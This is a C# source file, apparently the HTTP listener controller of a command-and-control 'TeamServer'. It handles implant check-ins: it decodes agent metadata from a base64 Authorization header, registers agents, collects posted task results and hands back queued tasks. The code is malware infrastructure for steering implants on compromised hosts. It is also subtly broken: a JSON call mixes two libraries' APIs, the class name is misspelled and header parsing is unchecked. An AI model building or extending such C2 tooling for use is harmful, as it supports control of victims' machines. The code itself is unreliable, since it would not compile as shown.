
using Microsoft.AspNetCore.Mvc;
using System.Text;

using Microsoft.AspNetCore.Http;
using TeamServer.Models.Agents;

using TeamServer.Services;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace TeamServer.Models.Listeners

{

    [Controller]
    public class HttpListenerConroller : ControllerBase
    {

        private readonly IAgentService _agent;
        public HttpListenerConroller(IAgentService agent)
        {
            _agent = agent;
        }
        public async Task<IActionResult> HandleImplant()
        {

            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            
            if (metadata is null) return NotFound();
            var agent = _agent.GetAgent(metadata.Id);
            if (agent is null)
            {

                agent = new Agent(metadata);
                _agent.AddAgent(agent);
            } ;

            agent.CheckIn();

            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                { 
                
                 json=await sr.ReadToEndAsync();
             
                
                }
             var results = JsonConverter.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
                agent.AddTaskResults(results);
            
            }

            var tasks = agent.GetPendingTask();
            return Ok(tasks);

        }
        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))

                return null;
            // Autorization: Bearer <base64>
            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            
            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            
            return JsonSerializer.Deserialize<AgentMetadata>(json);



        }
    }
}
